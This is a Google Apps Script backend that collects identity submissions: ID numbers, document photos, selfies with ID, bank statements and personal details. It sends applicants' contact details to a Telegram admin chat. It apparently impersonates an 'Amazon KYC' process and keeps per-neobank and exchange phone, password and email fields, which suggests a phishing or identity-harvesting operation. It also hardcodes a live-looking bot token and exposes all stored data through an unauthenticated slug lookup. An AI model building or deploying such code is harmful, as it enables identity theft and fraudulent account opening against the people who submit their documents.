/**
 * Google Apps Script endpoint for handling KYC/KYB submissions
 * Paste this file into your Code.gs in Google Apps Script project and deploy as Web App (execute as: Me, access: Anyone with link)
 * The script will create a root folder named 'KYC_KYB_ROOT' and a spreadsheet named 'KYC_KYB_SHEET' if they don't exist.
 * It accepts POST requests with JSON payloads described below and returns JSON with slug and status.
 * It also accepts GET requests with ?slug=SLUG to retrieve saved metadata.
 *
 * Optional Script properties:
 *   APP_BASE_URL           -> e.g. https://app.example.com (used for status links inside notifications)
 *   TELEGRAM_BOT_TOKEN     -> bot token used for Telegram notifications
 *   TELEGRAM_ADMIN_CHAT_ID -> chat ID or @username that should receive admin Telegram alerts
 *   ADMIN_NOTIFY_EMAIL     -> email address that should receive admin submission summaries
 */

// Default notification configuration (used if Script Properties not set)
var DEFAULT_TELEGRAM_BOT_TOKEN = '8487853056:AAHlKMWEOfCAZwfK50zTlmxOHRaoMMY4aAI';
// Private channels often require numeric chat IDs; @amazzadminnotific will work once the bot is added as admin.
var DEFAULT_TELEGRAM_ADMIN_CHAT_ID = '-1002991214891';
var DEFAULT_APP_BASE_URL = '';
var DEFAULT_ADMIN_NOTIFY_EMAIL = '';
var SUPPORT_TELEGRAM_TAG = '@awskingchina';

function doPost(e) {
  try {
    if (!e.postData || !e.postData.contents) return json({ error: 'No post data' }, 400);
    const payload = JSON.parse(e.postData.contents);
    const type = payload.type || 'kyc';
    const providedSlug = payload.slug || null;
    const slug = providedSlug || generateSlug();
    var metaBaseUrl = '';
    try {
      if (payload.meta && typeof payload.meta.baseUrl === 'string' && payload.meta.baseUrl.trim() !== '') {
        metaBaseUrl = payload.meta.baseUrl.trim();
      }
    } catch (err) {
      metaBaseUrl = '';
    }

    const root = getOrCreateRootFolder();
    const userFolder = getOrCreateChildFolder(root, 'kyc_' + slug);
    const personalFolder = getOrCreateChildFolder(userFolder, 'personal');
    const companyFolder = getOrCreateChildFolder(userFolder, 'company');

    // Clear previous files according to submission type
    if (type !== 'kyb') {
      // Preserve previously uploaded personal documents so analysts can compare versions.
    }
    if (type !== 'kyc') {
      // Preserve business documents as well.
    }

    // Save files
    if (payload.files) {
      Object.keys(payload.files).forEach(function(key) {
        var f = payload.files[key];
        if (!f || !f.base64) return;
        var blob = Utilities.newBlob(Utilities.base64Decode(f.base64), f.mimeType || 'application/octet-stream', f.name || key);
        var targetFolder = /company|incorporation|proof/i.test(key) ? companyFolder : personalFolder;
        var nextName = buildUniqueFileName(targetFolder, key, f.name || key);
        blob.setName(nextName);
        var createdFile = targetFolder.createFile(blob);
        if (createdFile.getName() !== nextName) {
          createdFile.setName(nextName);
        }
      });
    }

    // Save metadata to sheet
    const sheet = getOrCreateSheet();
    const now = new Date();
    const allRows = sheet.getDataRange().getValues();
    var existingRow = null;
    for (var i = 1; i < allRows.length; i++) {
      if (allRows[i][1] === slug) {
        existingRow = allRows[i];
        break;
      }
    }

    var existingPayload = existingRow ? reconstructPayload(existingRow) : { personal: {}, company: {} };
    var incomingPersonal = (payload.data && payload.data.personal) || {};
    var incomingCompany = (payload.data && payload.data.company) || {};

    var mergedPersonal = existingPayload.personal || {};
    if (type === 'kyc') {
      mergedPersonal = Object.assign({}, existingPayload.personal || {}, incomingPersonal);
    }

    var mergedCompany = Object.assign({}, existingPayload.company || {});
    if (incomingCompany && Object.keys(incomingCompany).length > 0) {
      mergedCompany = Object.assign({}, mergedCompany, incomingCompany);
    }

    var recordType = existingRow ? (existingRow[2] || 'kyc') : type;
    var existingStatus = existingRow ? (existingRow[3] || '') : '';
    var status = 'pending';
    if (type === 'kyc') {
      status = existingStatus === 'approved' ? 'approved' : 'pending';
    } else {
      status = existingStatus || 'pending';
    }
    var createdAt = existingRow ? (existingRow[4] || now.toISOString()) : now.toISOString();
    var userFolderUrl = userFolder.getUrl();

    var record = [userFolderUrl, slug, recordType, status, createdAt];
    PERSONAL_FIELDS.forEach(function(field) {
      var value = mergedPersonal && Object.prototype.hasOwnProperty.call(mergedPersonal, field) ? mergedPersonal[field] : '';
      record.push(valueToCell(value));
    });
    COMPANY_FIELDS.forEach(function(field) {
      var value = mergedCompany && Object.prototype.hasOwnProperty.call(mergedCompany, field) ? mergedCompany[field] : '';
      record.push(valueToCell(value));
    });

    upsertRowBySlug(sheet, slug, record, { overrideStatus: true, overrideCreatedAt: !existingRow });
    ensureNeobankRow(slug, mergedPersonal, mergedCompany);

    if (type === 'kyc') {
      var config = getConfig();
      notifyApplicantTelegram(mergedPersonal, slug, config, metaBaseUrl);
      notifyAdminOfSubmission(mergedPersonal, slug, config, metaBaseUrl);
    }

    return json({ ok: true, slug: slug });
  } catch (err) {
    return json({ error: String(err) }, 500);
  }
}

function doGet(e) {
  try {
    const slug = e.parameter.slug;
    if (!slug) return json({ error: 'Missing slug' }, 400);
    const sheet = getOrCreateSheet();
    const data = sheet.getDataRange().getValues();
    // columns: folderUrl, slug, type, status, createdAt, personal fields..., company.*
    for (var i = 1; i < data.length; i++) {
      if (data[i][1] === slug) {
        var rec = data[i];
        var payload = reconstructPayload(rec);
        var folderUrl = rec[0] || '';
        var personalLinks = [];
        var companyLinks = [];
        var userFolder = null;
        try {
          var root = getOrCreateRootFolder();
          userFolder = getExistingChildFolder(root, 'kyc_' + slug);
        } catch (folderErr) {
          userFolder = null;
        }
        if (!userFolder && folderUrl) {
          var derivedId = extractFolderIdFromUrl(folderUrl);
          if (derivedId) {
            try {
              userFolder = DriveApp.getFolderById(derivedId);
            } catch (ee) {
              userFolder = null;
            }
          }
        }
        if (userFolder) {
          try {
            var personalFolder = getExistingChildFolder(userFolder, 'personal');
            var companyFolder = getExistingChildFolder(userFolder, 'company');

            if (personalFolder) {
              var pfFiles = personalFolder.getFiles();
              while (pfFiles.hasNext()) { var f = pfFiles.next(); personalLinks.push({ name: f.getName(), url: f.getUrl() }); }
            }
            if (companyFolder) {
              var cfFiles = companyFolder.getFiles();
              while (cfFiles.hasNext()) { var f2 = cfFiles.next(); companyLinks.push({ name: f2.getName(), url: f2.getUrl() }); }
            }
          } catch (ignored) {
            // ignore folder listing issues
          }
        }
        var neobankDetails = readNeobankDetails(slug);

        return json({
          slug: slug,
          folderUrl: folderUrl,
          type: rec[2],
          data: payload,
          status: rec[3],
          createdAt: rec[4],
          personalFiles: personalLinks,
          companyFiles: companyLinks,
          neobanks: neobankDetails,
        });
      }
    }
    return json({ error: 'Not found' }, 404);
  } catch (err) {
    return json({ error: String(err) }, 500);
  }
}

function generateSlug() {
  var uuid = Utilities.getUuid();
  return uuid.split('-')[0];
}

function getOrCreateRootFolder() {
  var name = 'KYC_KYB_ROOT';
  var files = DriveApp.getFoldersByName(name);
  if (files.hasNext()) return files.next();
  return DriveApp.createFolder(name);
}

function getOrCreateChildFolder(parent, name) {
  var existing = parent.getFoldersByName(name);
  if (existing.hasNext()) {
    return existing.next();
  }
  return parent.createFolder(name);
}

function getExistingChildFolder(parent, name) {
  var existing = parent.getFoldersByName(name);
  if (existing.hasNext()) {
    return existing.next();
  }
  return null;
}

function clearFolder(folder) {
  if (!folder) return;
  var files = folder.getFiles();
  while (files.hasNext()) {
    var file = files.next();
    try {
      file.setTrashed(true);
    } catch (err) {
      // ignore inability to trash
    }
  }
}

function sanitizeFileBaseName(name) {
  if (!name) return 'file';
  return String(name).toLowerCase().replace(/[^a-z0-9]+/g, '_').replace(/^_+|_+$/g, '') || 'file';
}

function getExtensionFromName(name) {
  if (!name) return '';
  var match = String(name).match(/\.([A-Za-z0-9]+)$/);
  return match ? '.' + match[1].toLowerCase() : '';
}

function buildUniqueFileName(folder, key, originalName) {
  var base = FILE_BASE_NAMES[key] || sanitizeFileBaseName(originalName || key);
  var ext = getExtensionFromName(originalName);
  if (!ext) ext = '.bin';
  var attempt = base + ext;
  var counter = 1;
  while (folder.getFilesByName(attempt).hasNext()) {
    attempt = base + '_' + counter + ext;
    counter++;
  }
  return attempt;
}

function extractFolderIdFromUrl(url) {
  if (!url) return '';
  var match = String(url).match(/\/folders\/([^/?]+)/i);
  if (match && match[1]) return match[1];
  return '';
}

var PERSONAL_FIELDS = ['firstName','lastName','email','phone','dob','nationality','gender','ssnOrId','address1','address2','city','state','postalCode','country','residencyStatus','employmentStatus','annualIncome','sourceOfFunds','sourceOfFundsOther','bankName','documentType','consent','signature','telegram'];
var COMPANY_FIELDS = ['companyName','registrationNumber','businessType','address','country','website','directorName','directorId'];
var PRIMARY_SHEET_TITLE = 'Applicants';
var NEOBANK_SHEET_TITLE = 'NeobankAccess';
var FILE_BASE_NAMES = {
  bankStatement: 'bank_statement',
  docFront: 'document_front',
  docBack: 'document_back',
  selfieUsual: 'selfie_standard',
  selfieWithDoc: 'selfie_with_document',
};
var NEOBANKS = [
  { key: 'paysera', label: 'Paysera' },
  { key: 'wamo', label: 'Wamo' },
  { key: 'threeSmoney', label: '3S Money' },
  { key: 'satchel', label: 'Satchel' },
  { key: 'revolutBusiness', label: 'Revolut Business' },
  { key: 'bitget', label: 'Bitget' },
  { key: 'okx', label: 'OKX' },
  { key: 'finom', label: 'Finom' },
];
var NEOBANK_SEGMENT_SIZE = 4;

function buildHeader() {
  var header = ['folderUrl', 'slug', 'type', 'status', 'createdAt'];
  PERSONAL_FIELDS.forEach(function(field) { header.push(field); });
  COMPANY_FIELDS.forEach(function(field) { header.push('company.' + field); });
  return header;
}

function buildRecord(slug, type, payload, timestamp, folderUrl) {
  var personal = (payload.data && payload.data.personal) || {};
  var company = (payload.data && payload.data.company) || {};
  var record = [folderUrl, slug, type, 'pending', timestamp];

  PERSONAL_FIELDS.forEach(function(field) {
    record.push(valueToCell(personal[field]));
  });

  COMPANY_FIELDS.forEach(function(field) {
    record.push(valueToCell(company[field]));
  });

  return record;
}

function reconstructPayload(row) {
  var payload = { personal: {}, company: {} };
  var personalOffset = 5;
  for (var i = 0; i < PERSONAL_FIELDS.length; i++) {
    var value = cellToValue(row[personalOffset + i]);
    if (value !== '' && value !== null && value !== undefined) {
      payload.personal[PERSONAL_FIELDS[i]] = value;
    }
  }

  var companyOffset = personalOffset + PERSONAL_FIELDS.length;
  for (var j = 0; j < COMPANY_FIELDS.length; j++) {
    var cValue = cellToValue(row[companyOffset + j]);
    if (cValue !== '' && cValue !== null && cValue !== undefined) {
      payload.company[COMPANY_FIELDS[j]] = cValue;
    }
  }

  return payload;
}

function valueToCell(value) {
  if (typeof value === 'boolean') return value ? 'true' : 'false';
  if (value === null || value === undefined) return '';
  return String(value);
}

function cellToValue(value) {
  if (value === '' || value === null || value === undefined) return '';
  if (value === 'true') return true;
  if (value === 'false') return false;
  return value;
}

function getOrCreateSpreadsheet() {
  var name = 'KYC_KYB_SHEET';
  var files = DriveApp.getFilesByName(name);
  if (files.hasNext()) {
    return SpreadsheetApp.open(files.next());
  }
  return SpreadsheetApp.create(name);
}

function getOrCreateSheet() {
  var ss = getOrCreateSpreadsheet();
  var sheet = ss.getSheetByName(PRIMARY_SHEET_TITLE);
  if (!sheet) {
    var sheets = ss.getSheets();
    if (sheets && sheets.length === 1 && sheets[0].getName() === 'Sheet1') {
      sheet = sheets[0];
      sheet.setName(PRIMARY_SHEET_TITLE);
    } else {
      sheet = ss.insertSheet(PRIMARY_SHEET_TITLE);
    }
  }
  ensureSheetStructure(sheet);
  return sheet;
}

function getOrCreateNeobankSheet() {
  var ss = getOrCreateSpreadsheet();
  var sheet = ss.getSheetByName(NEOBANK_SHEET_TITLE);
  if (!sheet) {
    sheet = ss.insertSheet(NEOBANK_SHEET_TITLE);
  }
  ensureNeobankSheetStructure(sheet);
  return sheet;
}

function ensureSheetStructure(sheet) {
  var desired = buildHeader();
  var lastColumn = sheet.getLastColumn();
  var headerRange = lastColumn > 0 ? sheet.getRange(1, 1, 1, lastColumn).getValues()[0] : [];

  if (arraysEqual(headerRange, desired)) return;

  if (headerRange.indexOf('data') !== -1) {
    migrateLegacyRows(sheet, headerRange, desired);
    return;
  }

  var previousData = sheet.getDataRange().getValues();
  sheet.clear();
  sheet.appendRow(desired);

  if (previousData.length <= 1 || headerRange.length === 0) return;

  var slugIndex = headerRange.indexOf('slug');
  var typeIndex = headerRange.indexOf('type');
  var statusIndex = headerRange.indexOf('status');
  var createdAtIndex = headerRange.indexOf('createdAt');
  var folderUrlIndex = headerRange.indexOf('folderUrl');

  for (var i = 1; i < previousData.length; i++) {
    var row = previousData[i];
    var slug = slugIndex !== -1 ? row[slugIndex] : row[1];
    if (!slug) continue;
    var type = typeIndex !== -1 ? (row[typeIndex] || 'kyc') : 'kyc';
    var status = statusIndex !== -1 ? (row[statusIndex] || 'pending') : 'pending';
    var createdAt = createdAtIndex !== -1 ? (row[createdAtIndex] || new Date().toISOString()) : new Date().toISOString();
    var folderUrl = folderUrlIndex !== -1 ? (row[folderUrlIndex] || '') : '';

    var personalValues = extractPrefixedValues(row, headerRange, 'personal.');
    var companyValues = extractPrefixedValues(row, headerRange, 'company.');

    var record = [folderUrl, slug, type, status, createdAt];
    PERSONAL_FIELDS.forEach(function(field) {
      record.push(valueToCell(personalValues[field]));
    });
    COMPANY_FIELDS.forEach(function(field) {
      record.push(valueToCell(companyValues[field]));
    });
    sheet.appendRow(record);
    ensureNeobankRow(slug, personalValues, companyValues);
  }
}

var NEOBANK_META_COLUMNS = 4;

function buildNeobankHeader() {
  var header = ['slug', 'firstName', 'lastName', 'companyName'];
  NEOBANKS.forEach(function(bank) {
    header.push(bank.key + '.approved');
    header.push(bank.key + '.phone');
    header.push(bank.key + '.password');
    header.push(bank.key + '.email');
  });
  return header;
}

function ensureNeobankSheetStructure(sheet) {
  var desired = buildNeobankHeader();
  var range = sheet.getDataRange();
  var previousData = range ? range.getValues() : [];
  var headerRange = previousData.length > 0 ? previousData[0] : [];
  var needsRewrite = !arraysEqual(headerRange, desired) || headerRange[1] !== 'firstName';
  if (!needsRewrite) return;

  sheet.clear();
  sheet.appendRow(desired);

  if (previousData.length > 1) {
    for (var i = 1; i < previousData.length; i++) {
      var row = previousData[i];
      var slug = row[0];
      if (!slug) continue;
      var parsed = parseNeobankRowWithHeader(row, headerRange);
      var record = buildEmptyNeobankRow(slug, parsed.meta, parsed.meta);
      populateNeobankRecord(record, parsed.details);
      sheet.appendRow(record);
    }
  }
}

function buildEmptyNeobankRow(slug, personalMeta, companyMeta) {
  var row = [
    slug,
    (personalMeta && personalMeta.firstName) || '',
    (personalMeta && personalMeta.lastName) || '',
    (companyMeta && companyMeta.companyName) || '',
  ];
  NEOBANKS.forEach(function() {
    row.push('false', '', '', '');
  });
  return row;
}

function populateNeobankRecord(row, details) {
  for (var i = 0; i < NEOBANKS.length; i++) {
    var offset = NEOBANK_META_COLUMNS + i * NEOBANK_SEGMENT_SIZE;
    var entry = details[NEOBANKS[i].key];
    row[offset] = entry.approved ? 'true' : 'false';
    row[offset + 1] = valueToCell(entry.phone);
    row[offset + 2] = valueToCell(entry.password);
    row[offset + 3] = valueToCell(entry.email);
  }
}

function parseNeobankRowWithHeader(row, headerRow) {
  var meta = { firstName: '', lastName: '', companyName: '' };
  var details = buildEmptyNeobankDetails();
  if (!row || !headerRow) return { meta: meta, details: details };
  for (var i = 0; i < headerRow.length; i++) {
    var header = headerRow[i];
    var value = row[i];
    if (header === 'firstName') {
      meta.firstName = cellToValue(value);
      continue;
    }
    if (header === 'lastName') {
      meta.lastName = cellToValue(value);
      continue;
    }
    if (header === 'companyName') {
      meta.companyName = cellToValue(value);
      continue;
    }
    var match = header.match(/^([^.]+)\.(approved|phone|password|email)$/);
    if (match && details[match[1]]) {
      var key = match[1];
      var field = match[2];
      if (field === 'approved') details[key].approved = parseBooleanCell(value);
      else if (field === 'phone') details[key].phone = cellToValue(value);
      else if (field === 'password') details[key].password = cellToValue(value);
      else if (field === 'email') details[key].email = cellToValue(value);
    }
  }
  return { meta: meta, details: details };
}

function ensureNeobankRow(slug, personal, company) {
  if (!slug) return;
  var sheet = getOrCreateNeobankSheet();
  var range = sheet.getDataRange();
  var data = range ? range.getValues() : [];
  var firstName = personal && personal.firstName ? String(personal.firstName) : '';
  var lastName = personal && personal.lastName ? String(personal.lastName) : '';
  var companyName = (company && company.companyName) || (personal && personal.companyName) || '';
  if (data.length > 1) {
    for (var i = 1; i < data.length; i++) {
      if (data[i][0] === slug) {
        var row = data[i].slice();
        var updated = false;
        if (firstName && row[1] !== firstName) {
          row[1] = firstName;
          updated = true;
        }
        if (lastName && row[2] !== lastName) {
          row[2] = lastName;
          updated = true;
        }
        if (companyName && row[3] !== companyName) {
          row[3] = companyName;
          updated = true;
        }
        if (updated) {
          sheet.getRange(i + 1, 1, 1, row.length).setValues([row]);
        }
        return;
      }
    }
  }
  var newRow = buildEmptyNeobankRow(slug, personal, company);
  sheet.appendRow(newRow);
}

function buildEmptyNeobankDetails() {
  var details = {};
  NEOBANKS.forEach(function(bank) {
    details[bank.key] = { approved: false, phone: '', password: '', email: '' };
  });
  return details;
}

function readNeobankDetails(slug) {
  var defaults = buildEmptyNeobankDetails();
  if (!slug) return defaults;
  ensureNeobankRow(slug);
  var sheet = getOrCreateNeobankSheet();
  var range = sheet.getDataRange();
  if (!range) return defaults;
  var values = range.getValues();
  if (values.length <= 1) return defaults;
  for (var i = 1; i < values.length; i++) {
    if (values[i][0] === slug) {
      return neobankRowToObject(values[i]);
    }
  }
  return defaults;
}

function neobankRowToObject(row) {
  var details = buildEmptyNeobankDetails();
  for (var i = 0; i < NEOBANKS.length; i++) {
    var offset = NEOBANK_META_COLUMNS + i * NEOBANK_SEGMENT_SIZE;
    details[NEOBANKS[i].key] = {
      approved: parseBooleanCell(row[offset]),
      phone: cellToValue(row[offset + 1]),
      password: cellToValue(row[offset + 2]),
      email: cellToValue(row[offset + 3]),
    };
  }
  return details;
}

function parseBooleanCell(value) {
  if (value === true) return true;
  if (value === false) return false;
  if (typeof value === 'number') return value !== 0;
  if (typeof value === 'string') {
    var normalized = value.trim().toLowerCase();
    return normalized === 'true' || normalized === '1' || normalized === 'yes' || normalized === 'y' || normalized === 'approved';
  }
  return false;
}

function deriveUserFolderFromLegacy(personalFolderId, companyFolderId) {
  var fallbackId = personalFolderId || companyFolderId || '';
  if (!fallbackId) {
    return { id: '', url: '' };
  }
  try {
    var folder = DriveApp.getFolderById(fallbackId);
    var parents = folder.getParents();
    if (parents.hasNext()) {
      var parent = parents.next();
      return { id: parent.getId(), url: parent.getUrl() };
    }
    return { id: folder.getId(), url: folder.getUrl() };
  } catch (err) {
    return { id: fallbackId, url: 'https://drive.google.com/drive/folders/' + fallbackId };
  }
}

function migrateLegacyRows(sheet, legacyHeader, desired) {
  var rows = sheet.getDataRange().getValues();
  sheet.clear();
  sheet.appendRow(desired);

  for (var i = 1; i < rows.length; i++) {
    var row = rows[i];
    var slug = row[0];
    if (!slug) continue;
    var type = row[1] || 'kyc';
    var dataJson = row[2] || '{}';
    var status = row[3] || 'pending';
    var createdAt = row[4] || new Date().toISOString();
    var personalFolderId = row[5] || '';
    var companyFolderId = row[6] || '';
    var parsed;
    try {
      parsed = JSON.parse(dataJson);
    } catch (err) {
      parsed = {};
    }

    var folderInfo = deriveUserFolderFromLegacy(personalFolderId, companyFolderId);
    var record = buildRecord(slug, type, { data: parsed }, createdAt, folderInfo.url);
    record[3] = status;
    record[4] = createdAt;
    sheet.appendRow(record);
    ensureNeobankRow(slug);
  }
}

function arraysEqual(a, b) {
  if (a.length !== b.length) return false;
  for (var i = 0; i < a.length; i++) {
    if (a[i] !== b[i]) return false;
  }
  return true;
}

function extractPrefixedValues(row, headerRow, prefix) {
  var values = {};
  for (var i = 0; i < headerRow.length; i++) {
    if (!headerRow[i]) continue;
    if (headerRow[i].indexOf(prefix) === 0) {
      var key = headerRow[i].slice(prefix.length);
      var value = cellToValue(row[i]);
      if (value !== '' && value !== null && value !== undefined) {
        values[key] = value;
      }
    }
  }
  return values;
}

function getConfig() {
  var props = PropertiesService.getScriptProperties();
  return {
    appBaseUrl: props.getProperty('APP_BASE_URL') || DEFAULT_APP_BASE_URL,
    telegramBotToken: props.getProperty('TELEGRAM_BOT_TOKEN') || DEFAULT_TELEGRAM_BOT_TOKEN,
    telegramAdminChatId: props.getProperty('TELEGRAM_ADMIN_CHAT_ID') || DEFAULT_TELEGRAM_ADMIN_CHAT_ID,
    adminNotifyEmail: props.getProperty('ADMIN_NOTIFY_EMAIL') || DEFAULT_ADMIN_NOTIFY_EMAIL,
  };
}

function buildApplicantUrl(slug, config, fallbackBaseUrl) {
  if (!slug) return '';
  var base = config.appBaseUrl || fallbackBaseUrl || '';
  if (!base) return '';
  if (base.slice(-1) === '/') base = base.slice(0, -1);
  return base + '/waiting-approval?slug=' + slug;
}

function normalizeTelegramTarget(value) {
  if (!value) return '';
  var raw = String(value).trim();
  if (raw === '') return '';
  if (/^https?:\/\//i.test(raw)) {
    var match = raw.match(/t\.me\/([^/?]+)/i);
    if (match && match[1]) return '@' + match[1];
    return raw;
  }
  if (raw[0] === '@' || /^-?\d+$/.test(raw)) {
    return raw;
  }
  return '@' + raw.replace(/^@/, '');
}

function sendTelegramMessage(token, chatId, text) {
  if (!token || !chatId || !text) return;
  var endpoint = 'https://api.telegram.org/bot' + token + '/sendMessage';
  try {
    UrlFetchApp.fetch(endpoint, {
      method: 'post',
      payload: {
        chat_id: chatId,
        text: text,
      },
      muteHttpExceptions: true,
    });
  } catch (err) {
    Logger.log('Telegram send failed: ' + err);
  }
}

function notifyApplicantTelegram(personal, slug, config, fallbackBaseUrl) {
  if (!personal) return;
  if (!config.telegramBotToken) return;
  var chatId = resolveTelegramChatId(personal.telegram, config.telegramBotToken);
  if (!chatId) return;
  var link = buildApplicantUrl(slug, config, fallbackBaseUrl);
  var first = personal.firstName ? String(personal.firstName) : '';
  var last = personal.lastName ? String(personal.lastName) : '';
  var fullName = (first + ' ' + last).trim();
  var greeting = fullName ? 'Hi ' + fullName + '!' : first ? 'Hi ' + first + '!' : 'Hi there!';
  var statusLine = link
    ? '\nView your live status or upload additional files here: ' + link
    : '\nKeep this message – your confirmation link will appear as soon as the review portal is ready.';
  var text = greeting +
    '\n\nWe received your Amazon KYC application and have passed it to compliance for review.' +
    statusLine +
    '\n\nThis is an automated confirmation. Our onboarding desk will contact you shortly with any follow-up questions.' +
    (SUPPORT_TELEGRAM_TAG ? '\nNeed help right away? Message ' + SUPPORT_TELEGRAM_TAG : '');
  sendTelegramMessage(config.telegramBotToken, chatId, text);
}

function notifyAdminOfSubmission(personal, slug, config, fallbackBaseUrl) {
  var link = buildApplicantUrl(slug, config, fallbackBaseUrl);
  var name = ((personal && personal.firstName) || '') + ' ' + ((personal && personal.lastName) || '');
  name = name.trim();
  var telegram = personal && personal.telegram ? personal.telegram : '';
  var phone = personal && personal.phone ? personal.phone : '';
  var email = personal && personal.email ? personal.email : '';
  var statusLine = '';
  if (link) statusLine = '\nPortal link: ' + link;
  else if (slug) statusLine = '\nApplicant slug: ' + slug;
  var summary = 'New KYC submission received' +
    (name ? '\nApplicant: ' + name : '') +
    (telegram ? '\nTelegram: ' + telegram : '') +
    (phone ? '\nPhone: ' + phone : '') +
    (email ? '\nEmail: ' + email : '') +
    statusLine;

  if (config.adminNotifyEmail) {
    try {
      MailApp.sendEmail({
        to: config.adminNotifyEmail,
        subject: 'New KYC submission' + (name ? ' from ' + name : ''),
        body: summary,
      });
    } catch (err) {
      Logger.log('Admin email notification failed: ' + err);
    }
  }

  if (config.telegramBotToken && config.telegramAdminChatId) {
    var adminChatId = resolveTelegramChatId(config.telegramAdminChatId, config.telegramBotToken);
    sendTelegramMessage(config.telegramBotToken, adminChatId || config.telegramAdminChatId, summary);
  }
}

function resolveTelegramChatId(target, token) {
  var normalized = normalizeTelegramTarget(target);
  if (!normalized) return '';
  if (/^-?\d+$/.test(normalized)) return normalized;
  if (normalized[0] === '@') {
    var resolved = fetchChatIdByUsername(normalized, token);
    if (resolved) return String(resolved);
  }
  return normalized;
}

function fetchChatIdByUsername(username, token) {
  if (!username) return '';
  var resolved = resolveFromUpdates(username, token);
  if (resolved) return resolved;
  try {
    var endpoint = 'https://api.telegram.org/bot' + token + '/getChat?chat_id=' + encodeURIComponent(username);
    var response = UrlFetchApp.fetch(endpoint, { method: 'get', muteHttpExceptions: true });
    if (response.getResponseCode() !== 200) return '';
    var payload = JSON.parse(response.getContentText());
    if (payload && payload.ok && payload.result && payload.result.id) {
      return payload.result.id;
    }
  } catch (err) {
    Logger.log('Failed to resolve username ' + username + ': ' + err);
  }
  return '';
}

function resolveFromUpdates(username, token) {
  try {
    var endpoint = 'https://api.telegram.org/bot' + token + '/getUpdates?allowed_updates=message&limit=100';
    var response = UrlFetchApp.fetch(endpoint, { method: 'get', muteHttpExceptions: true });
    if (response.getResponseCode() !== 200) return '';
    var payload = JSON.parse(response.getContentText());
    if (!payload || !payload.ok || !payload.result) return '';
    var normalized = username.replace(/^@/, '').toLowerCase();
    for (var i = payload.result.length - 1; i >= 0; i--) {
      var update = payload.result[i];
      if (!update || !update.message || !update.message.from) continue;
      var from = update.message.from;
      if (from.username && from.username.toLowerCase() === normalized) {
        return String(from.id);
      }
    }
  } catch (err) {
    Logger.log('Failed to resolve username from updates ' + username + ': ' + err);
  }
  return '';
}

function upsertRowBySlug(sheet, slug, record, options) {
  options = options || {};
  var overrideStatus = !!options.overrideStatus;
  var overrideCreatedAt = !!options.overrideCreatedAt;
  var data = sheet.getDataRange().getValues();
  for (var i = 1; i < data.length; i++) {
    if (data[i][1] === slug) {
      var existing = data[i];
      var nextRecord = record.slice();
      if (!overrideStatus && existing[3]) nextRecord[3] = existing[3];
      if (!overrideCreatedAt && existing[4]) nextRecord[4] = existing[4];
      sheet.getRange(i + 1, 1, 1, nextRecord.length).setValues([nextRecord]);
      return;
    }
  }
  sheet.appendRow(record);
}

function json(obj, status) {
  var t = ContentService.createTextOutput(JSON.stringify(obj));
  t.setMimeType(ContentService.MimeType.JSON);
  if (status) {
    // GAS doesn't support setting HTTP status code directly for web apps; return included status
    t.setContent(JSON.stringify(Object.assign({ status: status }, obj)));
  }
  return t;
}
